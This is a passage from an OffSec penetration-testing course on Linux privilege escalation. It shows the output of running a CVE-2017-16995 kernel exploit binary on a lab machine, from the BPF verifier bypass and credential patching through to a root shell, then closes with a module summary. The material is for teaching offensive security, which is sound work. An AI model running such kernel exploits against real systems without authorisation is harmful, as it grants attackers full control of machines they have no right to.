# OffSec

Penetration Testing with Kali Linux

Using the file utility, we can also inspect the Linux ELF architecture.

```
joe@ubuntu-prvesc:~ $ file cve-2017-16995
cve-2017-16995: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32,
BuildID [shal]=588d674590e6...
```

Listing 516 - Explaining the exploit binary's architecture

With all the prerequisites in place we are now ready to run our kernel privilege escalation exploit.

```
joe@ubuntu-prvesc:~ $ ./cve-2017-16995
[.] t(--t) exploit for counterfeit grsecurity kernels as KSPP and linux-hardened t(-	)
[.]
 ** This vulnerability cannot be exploited at all on authentic grsecurity kernel
**
[[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair())
[*] attaching backdoor to socket
[*] skbuff = fffff88007bd1f100
[*] leaking sort from fffff880079bd9c00
[*] Sock->sk_rcvctime at offset 472
[*] cred structure at fffff880075c11e40
[*] UID from cred structure: 1001 matches the kernel: 1001
[*] hammering cred structure at fffff880075c11e40
[*] credentials patched, launching...
# id
uid=0(root) gid=0(root),1001(joe)
#
```

Listing 517 - Obtaining a root shell via kernel exploitation

Great! We managed to obtain a root shell by exploiting a known kernel vulnerability.

In this section, we learned how to manually enumerate our target for any known kernel vulnerabilities. We then discovered how to fieldsearch our information in order to select the right exploit source code. Finally, we compiled the exploit and ran it against the target machine to gain an administrative shell.

# 17.5 Wrapping Up

In this Module, we covered many concepts surrounding Linux privilege escalation. We explored both manual and automated enumeration techniques that reveal required information for these types of attacks. We also examined how to gain administrative access via unprotected credentials, insecure file permissions, and binary flags. We concluded by learning how to enumerate kernel vulnerabilities and finding matching exploits.